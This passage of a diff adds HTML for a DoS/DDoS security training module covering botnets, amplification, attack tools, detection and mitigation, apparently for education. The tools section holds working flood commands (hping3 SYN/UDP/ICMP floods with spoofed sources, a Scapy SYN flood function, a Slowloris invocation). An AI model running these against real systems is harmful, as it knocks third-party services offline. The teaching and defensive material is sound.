+                        <div class="timeline-item">
+                            <h4>3. 🔧 Maintenance & Updates</h4>
+                            <p>Bot software updates, additional payload downloads, persistence mechanisms</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>4. 💰 Monetization</h4>
+                            <p>DDoS attacks, spam campaigns, cryptocurrency mining, data theft</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>5. 🔄 Expansion</h4>
+                            <p>Spreading to new systems, recruiting additional bots, network growth</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>⚡ DDoS Amplification Techniques</h3>
+                    <p>Botnets use various techniques to amplify their attack power beyond their raw numbers:</p>
+                    
+                    <div class="labs-container">
+                        <div class="lab-card">
+                            <h4>🔄 Reflection Amplification</h4>
+                            <p>Uses public servers to amplify and redirect attack traffic.</p>
+                            <div class="lab-steps">
+                                <strong>How it Works:</strong>
+                                <ol>
+                                    <li>Bot sends small request with victim's spoofed IP</li>
+                                    <li>Public server sends large response to victim</li>
+                                    <li>Victim receives amplified traffic from legitimate servers</li>
+                                    <li>Attack appears to come from legitimate sources</li>
+                                </ol>
+                                
+                                <strong>Amplification Factors:</strong>
+                                <ul>
+                                    <li>DNS: 28-179x</li>
+                                    <li>NTP: 58-556x</li>
+                                    <li>SNMP: 6.3-650x</li>
+                                    <li>Memcached: 10,000-51,200x</li>
+                                </ul>
+                            </div>
+                        </div>
+                        
+                        <div class="lab-card">
+                            <h4>🎭 Multi-Vector Attacks</h4>
+                            <p>Combines multiple attack types simultaneously.</p>
+                            <div class="lab-steps">
+                                <strong>Common Combinations:</strong>
+                                <ul>
+                                    <li>Volumetric + Protocol attacks</li>
+                                    <li>Network + Application layer attacks</li>
+                                    <li>Multiple amplification protocols</li>
+                                    <li>Rotating attack vectors to evade defenses</li>
+                                </ul>
+                            </div>
+                        </div>
+                        
+                        <div class="lab-card">
+                            <h4>🔀 Advanced Evasion Techniques</h4>
+                            <p>Modern botnets employ sophisticated evasion methods.</p>
+                            <div class="lab-steps">
+                                <strong>Evasion Methods:</strong>
+                                <ul>
+                                    <li><strong>Burst Attacks:</strong> Short, intense bursts</li>
+                                    <li><strong>Low-and-Slow:</strong> Sustained, low-volume attacks</li>
+                                    <li><strong>Pulse Attacks:</strong> Rhythmic on/off patterns</li>
+                                    <li><strong>Carpet Bombing:</strong> Distributed across many targets</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>📊 Botnet Economics</h3>
+                    <div class="stats-container">
+                        <div class="stat-card">
+                            <div class="stat-number">$5-$10</div>
+                            <div>Per Hour DDoS Attack</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-number">$50-$500</div>
+                            <div>Per Day Sustained Attack</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-number">$2-$5</div>
+                            <div>Per 1,000 Bots/Month</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-number">$1M+</div>
+                            <div>Annual Botnet Revenue</div>
+                        </div>
+                    </div>
+                    
+                    <div class="warning-box">
+                        <h4>💰 Botnet-as-a-Service (BaaS) Model</h4>
+                        <p>Many criminals now offer botnet services on a rental basis, making DDoS attacks accessible to low-skill attackers. This has dramatically lowered the barrier to entry for conducting large-scale attacks.</p>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('tools')">Next: Attack Tools →</button>
+            </div>
+
+            <!-- Tools Section -->
+            <div id="tools" class="module-section">
+                <h2 class="section-title">🔧 DoS/DDoS Attack Tools & Techniques</h2>
+                
+                <div class="card">
+                    <h3>⚠️ Ethical Considerations & Legal Warning</h3>
+                    <div class="warning-box">
+                        <h4>🚨 IMPORTANT LEGAL NOTICE</h4>
+                        <p>The tools and techniques discussed in this section are for educational and authorized testing purposes ONLY. Unauthorized use of these tools against systems you do not own or have explicit permission to test is illegal and unethical. Always ensure you have proper authorization before conducting any DoS/DDoS testing.</p>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🛠️ DoS/DDoS Testing Tools Categories</h3>
+                    <div class="tool-grid">
+                        <div class="tool-card">
+                            <h4>🎯 Stress Testing Tools</h4>
+                            <p>Legitimate tools for authorized capacity testing</p>
+                            <ul style="text-align: left; margin-top: 15px;">
+                                <li>Apache Bench (ab)</li>
+                                <li>JMeter</li>
+                                <li>LoadRunner</li>
+                                <li>Siege</li>
+                            </ul>
+                        </div>
+                        <div class="tool-card">
+                            <h4>🔥 Network Flood Tools</h4>
+                            <p>Layer 3/4 volumetric attack tools</p>
+                            <ul style="text-align: left; margin-top: 15px;">
+                                <li>hping3</li>
+                                <li>Scapy</li>
+                                <li>Nmap</li>
+                                <li>Nemesy</li>
+                            </ul>
+                        </div>
+                        <div class="tool-card">
+                            <h4>💻 Application Layer Tools</h4>
+                            <p>Layer 7 attack simulation tools</p>
+                            <ul style="text-align: left; margin-top: 15px;">
+                                <li>Slowloris</li>
+                                <li>HULK</li>
+                                <li>GoldenEye</li>
+                                <li>HTTP Unbearable Load King</li>
+                            </ul>
+                        </div>
+                        <div class="tool-card">
+                            <h4>🌐 Multi-Vector Platforms</h4>
+                            <p>Comprehensive testing frameworks</p>
+                            <ul style="text-align: left; margin-top: 15px;">
+                                <li>LOIC/HOIC</li>
+                                <li>Metasploit</li>
+                                <li>DDOS-Attack</li>
+                                <li>TOR's Hammer</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔨 Detailed Tool Analysis</h3>
+                    <div class="labs-container">
+                        <div class="lab-card">
+                            <h4>🎯 hping3 - Network Testing Swiss Army Knife</h4>
+                            <p>Powerful command-line packet crafting and network testing tool.</p>
+                            <div class="lab-steps">
+                                <strong>Key Capabilities:</strong>
+                                <ul>
+                                    <li>TCP/UDP/ICMP packet generation</li>
+                                    <li>Port scanning and traceroute</li>
+                                    <li>Firewall testing and bypassing</li>
+                                    <li>Network performance testing</li>
+                                </ul>
+                                
+                                <strong>Example Commands:</strong>
+                                <div class="code-block">
+# SYN flood simulation (authorized testing only)
+hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source target.com
+
+# UDP flood test
+hping3 -2 -c 1000 -d 120 -p 53 --flood target.com
+
+# ICMP flood (ping flood)
+hping3 -1 --flood target.com
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="lab-card">
+                            <h4>🐍 Scapy - Packet Manipulation Framework</h4>
+                            <p>Python-based interactive packet manipulation program and library.</p>
+                            <div class="lab-steps">
+                                <strong>Capabilities:</strong>
+                                <ul>
+                                    <li>Custom packet crafting</li>
+                                    <li>Protocol analysis and manipulation</li>
+                                    <li>Network reconnaissance</li>
+                                    <li>Attack simulation scripting</li>
+                                </ul>
+                                
+                                <strong>Example Script (Educational):</strong>
+                                <div class="code-block">
+from scapy.all import *
+
+# Create custom SYN flood function
+def syn_flood(target_ip, target_port, count):
+    for i in range(count):
+        # Create random source IP
+        src_ip = ".".join([str(randint(1,254)) for _ in range(4)])
+        # Create SYN packet
+        packet = IP(src=src_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
+        send(packet, verbose=0)
+
+# WARNING: Only use on systems you own/have permission to test
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="lab-card">
+                            <h4>⚡ Slowloris - Application Layer DoS Tool</h4>
+                            <p>Demonstrates low-bandwidth application layer attack techniques.</p>
+                            <div class="lab-steps">
+                                <strong>Attack Mechanism:</strong>
+                                <ol>
+                                    <li>Opens multiple HTTP connections</li>
+                                    <li>Sends partial HTTP headers</li>
+                                    <li>Periodically sends additional data</li>
+                                    <li>Never completes requests</li>
+                                    <li>Exhausts server connection pool</li>
+                                </ol>
+                                
+                                <strong>Basic Usage (Educational):</strong>
+                                <div class="code-block">
+# Download and run (authorized testing only)
+perl slowloris.pl -dns target.example.com -port 80 -timeout 2000 -num 500
+
+# Parameters explanation:
+# -dns: target domain
+# -port: target port (usually 80 or 443)
+# -timeout: connection timeout
+# -num: number of connections to maintain
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="lab-card">
+                            <h4>🌐 Apache Bench (ab) - Legitimate Load Testing</h4>
+                            <p>Apache's built-in benchmarking tool for authorized capacity testing.</p>
+                            <div class="lab-steps">
+                                <strong>Professional Use Cases:</strong>
+                                <ul>
+                                    <li>Server capacity planning</li>
+                                    <li>Performance baseline establishment</li>
+                                    <li>Load balancer testing</li>
+                                    <li>Application optimization</li>
+                                </ul>
+                                
+                                <strong>Example Commands:</strong>
+                                <div class="code-block">
+# Basic load test: 1000 requests, 10 concurrent
+ab -n 1000 -c 10 http://yourserver.com/
+
+# POST request testing with keep-alive
+ab -n 100 -c 10 -k -T application/x-www-form-urlencoded 
+   -p postdata.txt http://yourserver.com/form
+
+# Extended testing with detailed output
+ab -n 10000 -c 100 -g results.tsv http://yourserver.com/
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔍 Tool Detection & Forensics</h3>
+                    <p>Understanding how to identify when these tools are being used against your systems:</p>
+                    
+                    <div class="attack-grid">
+                        <div class="attack-card">
+                            <h4>📊 Network-Level Indicators</h4>
+                            <ul>
+                                <li>Unusual traffic spikes</li>
+                                <li>High packet rates from single sources</li>
+                                <li>Malformed or fragmented packets</li>
+                                <li>Suspicious source IP patterns</li>
+                                <li>Protocol anomalies</li>
+                            </ul>
+                        </div>
+                        <div class="attack-card">
+                            <h4>💻 System-Level Indicators</h4>
+                            <ul>
+                                <li>Resource exhaustion alerts</li>
+                                <li>Connection table overflow</li>
+                                <li>Application timeout errors</li>
+                                <li>Memory/CPU spike patterns</li>
+                                <li>Service unavailability</li>
+                            </ul>
+                        </div>
+                        <div class="attack-card">
+                            <h4>📋 Log Analysis Patterns</h4>
+                            <ul>
+                                <li>Repetitive request patterns</li>
+                                <li>Unusual user agent strings</li>
+                                <li>Coordinated timing patterns</li>
+                                <li>Geographic clustering</li>
+                                <li>Protocol violation logs</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🛡️ Ethical Testing Framework</h3>
+                    <div class="success-box">
+                        <h4>✅ Best Practices for Authorized DoS Testing</h4>
+                        <ul>
+                            <li><strong>Written Authorization:</strong> Obtain explicit written permission</li>
+                            <li><strong>Scope Definition:</strong> Clearly define testing boundaries</li>
+                            <li><strong>Timing Coordination:</strong> Schedule tests during maintenance windows</li>
+                            <li><strong>Gradual Escalation:</strong> Start with low-impact tests</li>
+                            <li><strong>Monitoring Preparation:</strong> Have monitoring systems ready</li>
+                            <li><strong>Rollback Plan:</strong> Prepare immediate stop procedures</li>
+                            <li><strong>Documentation:</strong> Record all testing activities</li>
+                            <li><strong>Stakeholder Communication:</strong> Keep relevant parties informed</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('detection')">Next: Detection Techniques →</button>
+            </div>
+
+            <!-- Detection Section -->
+            <div id="detection" class="module-section">
+                <h2 class="section-title">🔍 DoS/DDoS Attack Detection</h2>
+                
+                <div class="card">
+                    <h3>🎯 Detection Fundamentals</h3>
+                    <p>Effective DoS/DDoS detection requires a multi-layered approach combining network monitoring, traffic analysis, and behavioral detection techniques.</p>
+                    
+                    <div class="info-box">
+                        <h4>🔬 Detection Challenges</h4>
+                        <ul>
+                            <li><strong>Volume Overwhelm:</strong> Attack traffic can saturate monitoring systems</li>
+                            <li><strong>False Positives:</strong> Legitimate traffic spikes vs. actual attacks</li>
+                            <li><strong>Distributed Nature:</strong> DDoS traffic appears from many sources</li>
+                            <li><strong>Protocol Mimicry:</strong> Attacks that look like legitimate traffic</li>
+                            <li><strong>Multi-Vector Complexity:</strong> Combined attack types</li>
+                            <li><strong>Reaction Time:</strong> Need for real-time or near-real-time detection</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>📊 Traffic Analysis Techniques</h3>
+                    <div class="attack-grid">
+                        <div class="attack-card">
+                            <h4>📈 Statistical Analysis</h4>
+                            <ul>
+                                <li><strong>Baseline Establishment:</strong> Normal traffic patterns</li>
+                                <li><strong>Threshold Monitoring:</strong> Traffic volume anomalies</li>
+                                <li><strong>Rate Analysis:</strong> Packets/connections per second</li>
+                                <li><strong>Variance Detection:</strong> Unusual traffic distribution</li>
+                            </ul>
+                        </div>
+                        <div class="attack-card">
+                            <h4>🔍 Signature-Based Detection</h4>
+                            <ul>
+                                <li><strong>Known Attack Patterns:</strong> Recognized attack signatures</li>
+                                <li><strong>Protocol Anomalies:</strong> Malformed packet detection</li>
+                                <li><strong>Payload Analysis:</strong> Content-based identification</li>
+                                <li><strong>Tool Fingerprinting:</strong> Specific tool signatures</li>
+                            </ul>
+                        </div>
+                        <div class="attack-card">
+                            <h4>🤖 Behavioral Analysis</h4>
+                            <ul>
+                                <li><strong>Machine Learning:</strong> AI-based pattern recognition</li>
+                                <li><strong>Anomaly Detection:</strong> Deviation from normal behavior</li>
+                                <li><strong>Clustering Analysis:</strong> Grouping similar traffic patterns</li>
+                                <li><strong>Temporal Analysis:</strong> Time-based pattern recognition</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>⚡ Real-Time Detection Methods</h3>
+                    <div class="labs-container">
+                        <div class="lab-card">
+                            <h4>🔧 Network Flow Analysis</h4>
+                            <p>Analyzing network flows to detect volumetric attacks.</p>
+                            <div class="lab-steps">
+                                <strong>Key Metrics to Monitor:</strong>
+                                <ul>
+                                    <li><strong>Bandwidth Utilization:</strong> Unusual spikes in network usage</li>
+                                    <li><strong>Packet Rate:</strong> High packets per second (pps)</li>
+                                    <li><strong>Connection Rate:</strong> New connections per second</li>
+                                    <li><strong>Flow Duration:</strong> Abnormally short or long flows</li>
+                                    <li><strong>Protocol Distribution:</strong> Unusual protocol ratios</li>
+                                </ul>
+                                
+                                <strong>Detection Thresholds:</strong>
+                                <div class="code-block">
+# Example detection thresholds
+Bandwidth: > 80% of link capacity for > 60 seconds
+Packet Rate: > 100,000 pps sustained
+SYN Rate: > 10,000 SYN/sec
+Connection Rate: > 1,000 new connections/sec
+UDP Rate: > 50,000 UDP packets/sec to single destination
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="lab-card">
+                            <h4>🎯 Protocol-Specific Detection</h4>
+                            <p>Targeted detection for specific protocol attacks.</p>
+                            <div class="lab-steps">
+                                <strong>SYN Flood Detection:</strong>
+                                <div class="code-block">
+# Monitor half-open connections
+netstat -n | grep SYN_RECV | wc -l
+
+# Check SYN to SYN-ACK ratio
+# Normal: ~1:1, Attack: >>1:1
+
+# TCP connection state monitoring
+ss -s | grep TCP
+                                </div>
+                                
+                                <strong>ICMP Flood Detection:</strong>
+                                <div class="code-block">
+# Monitor ICMP traffic rate
+tcpdump -i eth0 icmp | pv -l > /dev/null
+
+# ICMP packet size analysis
+tcpdump -i eth0 icmp -n -c 100 | awk '{print $NF}' | sort | uniq -c
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="lab-card">
+                            <h4>🕸️ Application Layer Detection</h4>
+                            <p>Detecting sophisticated Layer 7 attacks.</p>
+                            <div class="lab-steps">
+                                <strong>HTTP Flood Indicators:</strong>
+                                <ul>
+                                    <li>High request rate from single sources</li>
+                                    <li>Unusual user agent patterns</li>
+                                    <li>Repetitive request patterns</li>
+                                    <li>Missing or malformed headers</li>
+                                </ul>
+                                
+                                <strong>Slowloris Detection:</strong>
+                                <div class="code-block">
+# Monitor incomplete HTTP requests
+netstat -n | grep :80 | grep ESTABLISHED | wc -l
+
+# Check for many connections from same IP
+netstat -n | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🛠️ Detection Tools & Technologies</h3>
+                    <div class="tool-grid">
+                        <div class="tool-card">
+                            <h4>📊 SIEM Solutions</h4>
+                            <p>Security Information and Event Management</p>
+                            <ul style="text-align: left; margin-top: 15px;">
+                                <li>Splunk</li>
+                                <li>IBM QRadar</li>
+                                <li>ArcSight</li>
+                                <li>LogRhythm</li>
+                            </ul>
+                        </div>
+                        <div class="tool-card">
+                            <h4>🌐 Network Monitoring</h4>
+                            <p>Specialized network analysis tools</p>
+                            <ul style="text-align: left; margin-top: 15px;">
+                                <li>Wireshark</li>
+                                <li>ntopng</li>
+                                <li>SolarWinds NPM</li>
+                                <li>PRTG</li>
+                            </ul>
+                        </div>
+                        <div class="tool-card">
+                            <h4>🔍 Flow Analyzers</h4>
+                            <p>NetFlow/sFlow analysis platforms</p>
+                            <ul style="text-align: left; margin-top: 15px;">
+                                <li>SolarWinds NTA</li>
+                                <li>Plixer Scrutinizer</li>
+                                <li>ManageEngine NetFlow</li>
+                                <li>nfcapd/nfdump</li>
+                            </ul>
+                        </div>
+                        <div class="tool-card">
+                            <h4>🤖 AI/ML Platforms</h4>
+                            <p>Machine learning detection systems</p>
+                            <ul style="text-align: left; margin-top: 15px;">
+                                <li>Darktrace</li>
+                                <li>Vectra AI</li>
+                                <li>Arista AWE</li>
+                                <li>Cisco Stealthwatch</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>⚙️ Detection Architecture</h3>
+                    <p>Building a comprehensive DoS/DDoS detection system requires strategic placement of detection components:</p>
+                    
+                    <div class="attack-grid">
+                        <div class="attack-card">
+                            <h4>🌐 Network Perimeter</h4>
+                            <ul>
+                                <li><strong>Edge Routers:</strong> First-line traffic analysis</li>
+                                <li><strong>Firewalls:</strong> Protocol and rate monitoring</li>
+                                <li><strong>IDS/IPS:</strong> Signature and anomaly detection</li>
+                                <li><strong>Load Balancers:</strong> Traffic distribution monitoring</li>
+                            </ul>
+                        </div>
+                        <div class="attack-card">
+                            <h4>🏢 Internal Network</h4>
+                            <ul>
+                                <li><strong>Core Switches:</strong> Internal traffic flow monitoring</li>
+                                <li><strong>Network TAPs:</strong> Passive traffic collection</li>
+                                <li><strong>SPAN Ports:</strong> Traffic mirroring for analysis</li>
+                                <li><strong>Flow Collectors:</strong> NetFlow/sFlow aggregation</li>
+                            </ul>
+                        </div>
+                        <div class="attack-card">
+                            <h4>💻 Application Layer</h4>
+                            <ul>
+                                <li><strong>Web Application Firewalls:</strong> HTTP/HTTPS analysis</li>
+                                <li><strong>Application Servers:</strong> Resource utilization monitoring</li>
+                                <li><strong>Database Monitors:</strong> Connection and query analysis</li>
+                                <li><strong>CDN Analytics:</strong> Global traffic pattern analysis</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>📈 Machine Learning in DoS Detection</h3>
+                    <div class="info-box">
+                        <h4>🤖 AI-Enhanced Detection Capabilities</h4>
+                        <ul>
+                            <li><strong>Pattern Recognition:</strong> Identify complex attack patterns humans might miss</li>
+                            <li><strong>Adaptive Thresholds:</strong> Dynamic adjustment based on traffic patterns</li>
+                            <li><strong>False Positive Reduction:</strong> Learn from historical data to improve accuracy</li>
+                            <li><strong>Zero-Day Detection:</strong> Identify previously unknown attack patterns</li>
+                            <li><strong>Behavioral Profiling:</strong> Create detailed traffic behavior models</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="labs-container">
+                        <div class="lab-card">
+                            <h4>🎯 ML Algorithm Applications</h4>
+                            <div class="lab-steps">
+                                <strong>Supervised Learning:</strong>
+                                <ul>
+                                    <li><strong>Decision Trees:</strong> Rule-based classification</li>
+                                    <li><strong>Random Forest:</strong> Ensemble method for accuracy</li>
+                                    <li><strong>SVM:</strong> Support Vector Machines for binary classification</li>
+                                    <li><strong>Neural Networks:</strong> Deep learning pattern recognition</li>
+                                </ul>
+                                
+                                <strong>Unsupervised Learning:</strong>
+                                <ul>
+                                    <li><strong>K-Means Clustering:</strong> Group similar traffic patterns</li>
+                                    <li><strong>Isolation Forest:</strong> Anomaly detection</li>
+                                    <li><strong>DBSCAN:</strong> Density-based clustering</li>
+                                    <li><strong>Principal Component Analysis:</strong> Dimensionality reduction</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('countermeasures')">Next: Countermeasures →</button>
+            </div>
+
+            <!-- Countermeasures Section -->
+            <div id="countermeasures" class="module-section">
+                <h2 class="section-title">🛡️ DoS/DDoS Countermeasures & Mitigation</h2>
+                
+                <div class="card">
+                    <h3>🎯 Defense Strategy Overview</h3>
+                    <p>Effective DoS/DDoS protection requires a multi-layered defense strategy combining prevention, detection, and mitigation techniques across all network layers.</p>
+                    
+                    <div class="success-box">
+                        <h4>🛡️ Defense-in-Depth Principle</h4>
+                        <ul>
+                            <li><strong>Prevention:</strong> Reduce attack surface and harden systems</li>
+                            <li><strong>Detection:</strong> Identify attacks as early as possible</li>
+                            <li><strong>Mitigation:</strong> Minimize impact when attacks occur</li>
+                            <li><strong>Response:</strong> Coordinate effective incident response</li>
+                            <li><strong>Recovery:</strong> Restore services and analyze lessons learned</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🏗️ Infrastructure-Level Defenses</h3>
+                    <div class="attack-grid">
+                        <div class="attack-card">
+                            <h4>🌐 Network Architecture</h4>
+                            <ul>
+                                <li><strong>Over-provisioning:</strong> Excess bandwidth capacity</li>
+                                <li><strong>Load Distribution:</strong> Multiple servers and data centers</li>
+                                <li><strong>Anycast Routing:</strong> Traffic distribution across nodes</li>
+                                <li><strong>CDN Integration:</strong> Content delivery networks</li>
+                                <li><strong>Redundancy:</strong> Multiple network paths</li>
+                            </ul>
+                        </div>
+                        <div class="attack-card">
+                            <h4>🔧 Router & Switch Configuration</h4>
+                            <ul>
+                                <li><strong>Rate Limiting:</strong> Traffic shaping and policing</li>
+                                <li><strong>Access Control Lists:</strong> IP filtering rules</li>
+                                <li><strong>TCP Intercept:</strong> SYN flood protection</li>
+                                <li><strong>BGP Configuration:</strong> Routing table optimization</li>
+                                <li><strong>QoS Policies:</strong> Priority traffic handling</li>
+                            </ul>
+                        </div>
+                        <div class="attack-card">
+                            <h4>🔥 Firewall Protection</h4>
+                            <ul>
+                                <li><strong>Stateful Inspection:</strong> Connection state tracking</li>
+                                <li><strong>Connection Limiting:</strong> Per-source restrictions</li>
+                                <li><strong>Protocol Validation:</strong> Malformed packet filtering</li>
+                                <li><strong>Geographic Filtering:</strong> Country-based blocking</li>
+                                <li><strong>Application Control:</strong> Layer 7 filtering</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>⚡ Active Mitigation Technologies</h3>
+                    <div class="labs-container">
+                        <div class="lab-card">
+                            <h4>🛡️ DDoS Protection Services</h4>
+                            <p>Cloud-based and on-premise DDoS mitigation solutions.</p>
+                            <div class="lab-steps">
+                                <strong>Major Providers:</strong>
+                                <ul>
+                                    <li><strong>Cloudflare:</strong> DNS-based protection, global network</li>
+                                    <li><strong>Akamai:</strong> Kona Site Defender, edge protection</li>
+                                    <li><strong>AWS Shield:</strong> Standard and Advanced protection</li>
+                                    <li><strong>Arbor Networks:</strong> On-premise and cloud solutions</li>
+                                    <li><strong>Radware:</strong> DefensePro, cloud solutions</li>
+                                </ul>
+                                
+                                <strong>Protection Mechanisms:</strong>
+                                <ul>
+                                    <li><strong>Traffic Scrubbing:</strong> Clean traffic forwarding</li>
+                                    <li><strong>Rate Limiting:</strong> Per-source traffic controls</li>
+                                    <li><strong>Behavioral Analysis:</strong> AI-based filtering</li>
+                                    <li><strong>Challenge-Response:</strong> Human verification</li>
+                                    <li><strong>Global Distribution:</strong> Attack traffic absorption</li>
+                                </ul>
+                            </div>
+                        </div>
+                        
+                        <div class="lab-card">
+                            <h4>🔍 Intrusion Prevention Systems (IPS)</h4>
+                            <p>Inline protection with real-time attack blocking.</p>
+                            <div class="lab-steps">
+                                <strong>IPS Capabilities:</strong>
+                                <ul>
+                                    <li><strong>Signature Detection:</strong> Known attack patterns</li>
+                                    <li><strong>Anomaly Detection:</strong> Behavioral analysis</li>
+                                    <li><strong>Protocol Validation:</strong> RFC compliance checking</li>
+                                    <li><strong>Rate-Based Detection:</strong> Threshold monitoring</li>
+                                    <li><strong>Reputation Filtering:</strong> IP blacklist/whitelist</li>
+                                </ul>
+                                
+                                <strong>Example Configuration:</strong>
+                                <div class="code-block">
+# Snort IPS rule examples for DoS detection
+# SYN flood detection
+alert tcp any any -> $HOME_NET any (msg:"SYN Flood"; flags:S,12; threshold: type both, track by_src, count 70, seconds 10; sid:1000001;)
+
+# ICMP flood detection
+alert icmp any any -> $HOME_NET any (msg:"ICMP Flood"; threshold: type both, track by_src, count 50, seconds 10; sid:1000002;)
+
+# HTTP GET flood
+alert tcp any any -> $HOME_NET $HTTP_PORTS (msg:"HTTP GET Flood"; content:"GET"; http_method; threshold: type both, track by_src, count 50, seconds 10; sid:1000003;)
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="lab-card">
+                            <h4>🌐 Load Balancers & Traffic Distribution</h4>
+                            <p>Distributing traffic load to prevent single points of failure.</p>
+                            <div class="lab-steps">
+                                <strong>Load Balancing Benefits:</strong>
+                                <ul>
+                                    <li><strong>Traffic Distribution:</strong> Spread load across servers</li>
+                                    <li><strong>Health Monitoring:</strong> Automatic failover</li>
+                                    <li><strong>SSL Termination:</strong> Centralized certificate management</li>
+                                    <li><strong>Connection Multiplexing:</strong> Efficient resource usage</li>
+                                    <li><strong>Rate Limiting:</strong> Per-client request controls</li>
+                                </ul>
+                                
+                                <strong>Advanced Features:</strong>
+                                <ul>
+                                    <li><strong>Geographic Load Balancing:</strong> DNS-based routing</li>
+                                    <li><strong>Application-Aware Routing:</strong> Content-based decisions</li>
+                                    <li><strong>DDoS Detection Integration:</strong> Automatic traffic filtering</li>
+                                    <li><strong>Adaptive Algorithms:</strong> Dynamic load distribution</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>💻 Server-Level Hardening</h3>
+                    <div class="attack-grid">
+                        <div class="attack-card">
+                            <h4>⚙️ Operating System Tuning</h4>
+                            <ul>
+                                <li><strong>TCP/IP Stack:</strong> Buffer and timeout optimization</li>
+                                <li><strong>Connection Limits:</strong> Per-process restrictions</li>
+                                <li><strong>Memory Management:</strong> Buffer overflow protection</li>
+                                <li><strong>Process Limits:</strong> Resource consumption controls</li>
+                            </ul>
+                        </div>
+                        <div class="attack-card">
+                            <h4>🌐 Web Server Configuration</h4>
+                            <ul>
+                                <li><strong>Request Rate Limiting:</strong> Per-IP restrictions</li>
+                                <li><strong>Connection Timeout:</strong> Aggressive timeout values</li>
+                                <li><strong>Keep-Alive Tuning:</strong> Connection reuse optimization</li>
+                                <li><strong>Worker Process Limits:</strong> Resource allocation</li>
+                            </ul>
+                        </div>
+                        <div class="attack-card">
+                            <h4>🛡️ Application-Level Protection</h4>
+                            <ul>
+                                <li><strong>Input Validation:</strong> Request sanitization</li>
+                                <li><strong>Session Management:</strong> Token-based authentication</li>
+                                <li><strong>Caching Strategies:</strong> Reduce server load</li>
+                                <li><strong>CAPTCHA Integration:</strong> Human verification</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>📋 Incident Response Framework</h3>
+                    <div class="timeline">
+                        <div class="timeline-item">
+                            <h4>🚨 1. Detection & Alert</h4>
+                            <ul>
+                                <li>Automated monitoring systems trigger alerts</li>
+                                <li>SOC team validates attack indicators</li>
+                                <li>Initial impact assessment</li>
+                                <li>Stakeholder notification protocols</li>
+                            </ul>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>🔍 2. Analysis & Classification</h4>
+                            <ul>
+                                <li>Attack type identification (volumetric/protocol/application)</li>
+                                <li>Source analysis and attribution</li>
+                                <li>Impact scope determination</li>
+                                <li>Resource requirement assessment</li>
+                            </ul>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>⚡ 3. Immediate Response</h4>
+                            <ul>
+                                <li>Activate DDoS protection services</li>
+                                <li>Implement traffic filtering rules</li>
+                                <li>Scale infrastructure resources</li>
+                                <li>Coordinate with ISP/upstream providers</li>
+                            </ul>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>🛠️ 4. Mitigation & Containment</h4>
+                            <ul>
+                                <li>Fine-tune filtering rules</li>
+                                <li>Implement rate limiting</li>
+                                <li>Redirect traffic through scrubbing centers</li>
+                                <li>Monitor mitigation effectiveness</li>
+                            </ul>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>📊 5. Recovery & Analysis</h4>
+                            <ul>
+                                <li>Gradual service restoration</li>
+                                <li>Monitor for attack resumption</li>
+                                <li>Document lessons learned</li>
+                                <li>Update defense strategies</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>☁️ Cloud-Based DDoS Protection</h3>
+                    <p>Leveraging cloud infrastructure for scalable DDoS protection:</p>
+                    
+                    <div class="info-box">
+                        <h4>🌟 Advantages of Cloud Protection</h4>
+                        <ul>
+                            <li><strong>Massive Scale:</strong> Global infrastructure capacity</li>
+                            <li><strong>Always-On Protection:</strong> 24/7 monitoring and mitigation</li>
+                            <li><strong>Rapid Deployment:</strong> Quick activation and configuration</li>
+                            <li><strong>Cost Efficiency:</strong> Pay-as-you-use models</li>
+                            <li><strong>Expert Management:</strong> Specialized security teams</li>
+                            <li><strong>Continuous Updates:</strong> Latest threat intelligence</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="warning-box">
+                        <h4>⚠️ Considerations & Limitations</h4>
+                        <ul>
+                            <li><strong>Latency Impact:</strong> Additional hops may increase response time</li>
+                            <li><strong>Dependency Risk:</strong> Reliance on third-party services</li>
+                            <li><strong>Cost Scaling:</strong> Expenses during large attacks</li>
